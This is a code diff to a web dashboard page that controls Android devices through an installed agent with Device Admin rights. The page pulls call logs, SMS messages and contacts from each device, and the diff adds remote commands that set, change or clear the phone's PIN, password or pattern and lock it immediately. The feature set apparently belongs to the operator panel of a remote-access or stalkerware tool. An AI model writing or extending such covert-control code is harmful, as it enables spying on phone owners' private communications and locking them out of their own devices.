@@ -3,13 +3,15 @@
 import { AppSidebar } from "@/components/app-sidebar";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { Phone, MessageSquare, Users, RefreshCw } from "lucide-react";
+import { Phone, MessageSquare, Users, RefreshCw, Lock, KeyRound } from "lucide-react";
 import { useEffect, useState } from "react";
 import { useSearchParams } from "next/navigation";
 import { useGateway } from "@/hooks/use-gateway";
 import Select from "react-select";
+import { toast } from "sonner";
 
-type Tab = "calls" | "sms" | "contacts";
+type Tab = "calls" | "sms" | "contacts" | "lock";
+type LockKind = "pin" | "password" | "pattern";
 
 interface CallEntry {
   _id: string;
@@ -32,6 +34,17 @@ interface ContactEntry {
   phone: string;
 }
 
+interface LockStatus {
+  adminActive?: boolean;
+  deviceSecure?: boolean;
+  passwordQualityLabel?: string;
+  canSetCredential?: boolean;
+  fullChannel?: boolean;
+  note?: string;
+  message?: string;
+  success?: boolean;
+}
+
 export default function PhonePage() {
   const searchParams = useSearchParams();
   const { devices, dispatch, subscribe, resolveTarget, ensureConnected } = useGateway();
@@ -42,6 +55,11 @@ export default function PhonePage() {
   const [smsMessages, setSmsMessages] = useState<SmsEntry[]>([]);
   const [contacts, setContacts] = useState<ContactEntry[]>([]);
   const [searchQuery, setSearchQuery] = useState("");
+  const [lockStatus, setLockStatus] = useState<LockStatus | null>(null);
+  const [lockKind, setLockKind] = useState<LockKind>("pin");
+  const [lockValue, setLockValue] = useState("");
+  const [lockBusy, setLockBusy] = useState(false);
+  const [lastLockMsg, setLastLockMsg] = useState("");
 
   useEffect(() => {
     ensureConnected();
@@ -55,17 +73,42 @@ export default function PhonePage() {
     return subscribe((event) => {
       if (event.type !== "json" || !event.packet) return;
       const msg = event.packet as Record<string, unknown>;
-      if (msg.type !== "history_telemetry") return;
-      const entries = Array.isArray(msg.entries) ? msg.entries : [];
-      if (msg.command === "FETCH_CALL_LOGS" && entries.length) setCallLogs(entries as CallEntry[]);
-      if (msg.command === "FETCH_SMS_MESSAGES" && entries.length) setSmsMessages(entries as SmsEntry[]);
-      if (msg.command === "FETCH_CONTACTS" && entries.length) setContacts(entries as ContactEntry[]);
-      setLoading(false);
+      if (msg.type === "history_telemetry") {
+        const entries = Array.isArray(msg.entries) ? msg.entries : [];
+        if (msg.command === "FETCH_CALL_LOGS" && entries.length) setCallLogs(entries as CallEntry[]);
+        if (msg.command === "FETCH_SMS_MESSAGES" && entries.length) setSmsMessages(entries as SmsEntry[]);
+        if (msg.command === "FETCH_CONTACTS" && entries.length) setContacts(entries as ContactEntry[]);
+        setLoading(false);
+      }
+      if (msg.type === "sys_ack") {
+        const action = String(msg.action || "");
+        if (
+          action === "FETCH_LOCK_STATUS" ||
+          action === "SET_LOCK_CREDENTIAL" ||
+          action === "LOCK_DEVICE_NOW" ||
+          action === "CLEAR_LOCK_CREDENTIAL" ||
+          action === "LOCK_SCREEN"
+        ) {
+          const lock = (msg.lock as LockStatus) || {};
+          const merged = { ...lock, message: String(msg.message || lock.message || "") };
+          setLockStatus(merged);
+          setLastLockMsg(merged.message || "");
+          setLockBusy(false);
+          setLoading(false);
+          if (msg.status === "error") toast.error(merged.message || "Lock command failed");
+          else if (action !== "FETCH_LOCK_STATUS") toast.success(merged.message || "OK");
+        }
+      }
     });
   }, [subscribe]);
 
   useEffect(() => {
     if (!selectedDevice) return;
+    if (activeTab === "lock") {
+      setLoading(true);
+      dispatch("FETCH_LOCK_STATUS", {}, selectedDevice);
+      return;
+    }
     let cancelled = false;
     setLoading(true);
     (async () => {
@@ -102,14 +145,45 @@ export default function PhonePage() {
     return () => {
       cancelled = true;
     };
-  }, [activeTab, selectedDevice]);
+  }, [activeTab, selectedDevice, dispatch]);
 
   const refreshLive = () => {
     if (!selectedDevice) return;
     setLoading(true);
     if (activeTab === "calls") dispatch("FETCH_CALL_LOGS", {}, selectedDevice);
     else if (activeTab === "sms") dispatch("FETCH_SMS_MESSAGES", {}, selectedDevice);
+    else if (activeTab === "lock") dispatch("FETCH_LOCK_STATUS", {}, selectedDevice);
     else dispatch("FETCH_CONTACTS", {}, selectedDevice);
+  };
+
+  const applyLock = () => {
+    if (!selectedDevice || !lockValue.trim()) {
+      toast.error("Enter new PIN / password / pattern");
+      return;
+    }
+    setLockBusy(true);
+    const result = dispatch(
+      "SET_LOCK_CREDENTIAL",
+      { type: lockKind, value: lockValue.trim() },
+      selectedDevice
+    );
+    if (!result.ok) {
+      setLockBusy(false);
+      toast.error("Agent offline?");
+    }
+  };
+
+  const lockNow = () => {
+    if (!selectedDevice) return;
+    setLockBusy(true);
+    dispatch("LOCK_DEVICE_NOW", {}, selectedDevice);
+  };
+
+  const clearLock = () => {
+    if (!selectedDevice) return;
+    if (!confirm("Clear device lock if OEM allows?")) return;
+    setLockBusy(true);
+    dispatch("CLEAR_LOCK_CREDENTIAL", {}, selectedDevice);
   };
 
   const q = searchQuery.trim().toLowerCase();
@@ -141,7 +215,9 @@ export default function PhonePage() {
           <div className="flex flex-wrap items-center justify-between gap-3 mb-6">
             <div>
               <h1 className="text-2xl font-display tracking-tight">Phone</h1>
-              <p className="text-sm text-muted-foreground">Calls, messages & contacts (Android)</p>
+              <p className="text-sm text-muted-foreground">
+                Calls, messages, contacts & lock (Full APK + Device Admin)
+              </p>
             </div>
             <div className="flex items-center gap-2">
               <div className="w-56">
@@ -160,19 +236,20 @@ export default function PhonePage() {
             </div>
           </div>
 
-          <div className="flex gap-2 border-b border-border mb-4">
+          <div className="flex gap-2 border-b border-border mb-4 overflow-x-auto">
             {(
               [
                 { id: "calls" as const, label: "Calls", icon: Phone },
                 { id: "sms" as const, label: "Messages", icon: MessageSquare },
                 { id: "contacts" as const, label: "Contacts", icon: Users },
+                { id: "lock" as const, label: "Lock / PIN", icon: Lock },
               ] as const
             ).map((tab) => (
               <button
                 key={tab.id}
                 type="button"
                 onClick={() => setActiveTab(tab.id)}
-                className={`px-4 py-2 text-sm border-b-2 flex items-center gap-2 ${
+                className={`px-4 py-2 text-sm border-b-2 flex items-center gap-2 whitespace-nowrap ${
                   activeTab === tab.id
                     ? "border-foreground text-foreground"
                     : "border-transparent text-muted-foreground"
@@ -184,12 +261,14 @@ export default function PhonePage() {
             ))}
           </div>
 
-          <input
-            value={searchQuery}
-            onChange={(e) => setSearchQuery(e.target.value)}
-            placeholder="Search number, name, message…"
-            className="mb-4 w-full max-w-md rounded-lg border border-border bg-background px-3 py-2 text-sm"
-          />
+          {activeTab !== "lock" && (
+            <input
+              value={searchQuery}
+              onChange={(e) => setSearchQuery(e.target.value)}
+              placeholder="Search number, name, message…"
+              className="mb-4 w-full max-w-md rounded-lg border border-border bg-background px-3 py-2 text-sm"
+            />
+          )}
 
           <div className="space-y-3">
             {activeTab === "calls" &&
@@ -246,6 +325,86 @@ export default function PhonePage() {
                   </Card>
                 ))
               ))}
+
+            {activeTab === "lock" && (
+              <div className="space-y-4 max-w-xl">
+                <Card className="p-5 space-y-3">
+                  <div className="flex items-center gap-2">
+                    <KeyRound className="w-5 h-5" />
+                    <h2 className="font-semibold">View lock status</h2>
+                  </div>
+                  <p className="text-xs text-muted-foreground">
+                    Android never allows reading the current PIN/password/pattern. Status + change only (Full APK +
+                    Device Admin on phone).
+                  </p>
+                  <div className="grid grid-cols-2 gap-2 text-sm">
+                    <div className="rounded-lg border border-border p-3">
+                      <p className="text-xs text-muted-foreground">Device Admin</p>
+                      <p className="font-medium">{lockStatus?.adminActive ? "ON" : "OFF"}</p>
+                    </div>
+                    <div className="rounded-lg border border-border p-3">
+                      <p className="text-xs text-muted-foreground">Lock set</p>
+                      <p className="font-medium">{lockStatus?.deviceSecure ? "Yes" : "No / unknown"}</p>
+                    </div>
+                    <div className="rounded-lg border border-border p-3 col-span-2">
+                      <p className="text-xs text-muted-foreground">Quality</p>
+                      <p className="font-medium">{lockStatus?.passwordQualityLabel || "—"}</p>
+                    </div>
+                  </div>
+                  {lastLockMsg ? <p className="text-xs text-muted-foreground">{lastLockMsg}</p> : null}
+                  {lockStatus?.fullChannel === false ? (
+                    <p className="text-sm text-amber-600">Lite APK detected — install Full APK for lock control.</p>
+                  ) : null}
+                  <Button variant="outline" size="sm" onClick={refreshLive} disabled={!selectedDevice || loading}>
+                    Refresh status
+                  </Button>
+                </Card>
+
+                <Card className="p-5 space-y-3">
+                  <h2 className="font-semibold">Change PIN / password / pattern</h2>
+                  <div className="flex flex-wrap gap-2">
+                    {(["pin", "password", "pattern"] as LockKind[]).map((k) => (
+                      <button
+                        key={k}
+                        type="button"
+                        onClick={() => setLockKind(k)}
+                        className={`px-3 py-1.5 rounded-md text-sm border ${
+                          lockKind === k
+                            ? "border-foreground bg-foreground text-background"
+                            : "border-border text-muted-foreground"
+                        }`}
+                      >
+                        {k === "pin" ? "PIN" : k === "password" ? "Password" : "Pattern"}
+                      </button>
+                    ))}
+                  </div>
+                  <input
+                    type={lockKind === "password" ? "password" : "text"}
+                    value={lockValue}
+                    onChange={(e) => setLockValue(e.target.value)}
+                    placeholder={
+                      lockKind === "pin"
+                        ? "New PIN (4+ digits)"
+                        : lockKind === "password"
+                          ? "New password (4+ chars)"
+                          : "Pattern path e.g. 12369 (dots 1–9)"
+                    }
+                    className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm font-mono"
+                  />
+                  <div className="flex flex-wrap gap-2">
+                    <Button onClick={applyLock} disabled={!selectedDevice || lockBusy}>
+                      Set / change lock
+                    </Button>
+                    <Button variant="outline" onClick={lockNow} disabled={!selectedDevice || lockBusy}>
+                      Lock device now
+                    </Button>
+                    <Button variant="ghost" onClick={clearLock} disabled={!selectedDevice || lockBusy}>
+                      Clear lock
+                    </Button>
+                  </div>
+                </Card>
+              </div>
+            )}
           </div>
         </div>
       </main>
